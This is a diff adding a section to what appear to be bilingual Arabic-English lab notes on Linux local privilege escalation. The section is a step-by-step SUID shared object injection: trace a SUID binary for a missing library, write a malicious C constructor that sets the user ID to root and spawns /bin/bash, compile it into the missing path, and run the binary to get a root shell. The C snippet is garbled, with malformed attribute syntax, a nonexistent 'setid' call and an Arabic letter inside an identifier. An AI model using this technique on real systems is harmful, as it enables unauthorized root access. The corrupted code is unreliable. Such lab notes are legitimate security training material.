@@ -456,6 +456,48 @@ Used responsibly, this is a great example of **local privilege escalation** via 
 
 * <details>
      <summary>Shared Object Injection</summary>
+
+
+   # SUID/SGID Executables - Shared Object Injection
+
+   ### 9) SUID/SGID executables - Shared object injection
+
+   * هنا ضمن الملفات التي وجدناها تحمل صلاحيات SUID SGID وجدنا الملف: `/usr/local/bin/suid-so`
+   * عند محاولة تشغيله يقوم بالتحميل ولكن لا نعرف ماذا يحدث.
+
+   * `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`
+       * عرض العمليات التي يقوم بها الملف من قبل `strace` لفلترة العمليات التى تخص 
+       * فتح ملفات او محاولات البحث عن ملفات غير موجوده
+       * Example output showing a missing library: `/home/user/.config/libcalc.so`
+       * (وجدنا أن الملف يحاول تحميل مكتبه مشفره ولكنه لا يجدها)
+
+   * `mkdir /home/user/.config`
+       * (المجلد الذى به الملف)
+
+   * Create the malicious library file (`libcalc.c`):
+       * (قم بعمل هذا الملف فى اى مسار على النظام)
+       ```c
+       #include <stdio.h>
+       #include <stdlib.h>
+
+       void _attribute_((constructor)) init() {
+           setid(0);
+           setلid(0);
+           system("/bin/bash");
+       }
+       ```
+
+   * `gcc -shared -fPIC -o /home/user/.config/libcalc.so ~/path/to/your/libcalc.c`
+       * (تم تحويل الكود من الملف إلى مكتبه مشتركه وإرساله الى المسار المراد)
+
+   * `/usr/local/bin/suid-so`
+       * (تشغيل الملف مرة أخرى ولكن هذه المرة سوف يجد المكتبة المحقونة وتكون خبيثة)
+
+   * `whoami`
+       * `root`
+       * (مبروك يا باشا)
+
+
   </details>
 
 
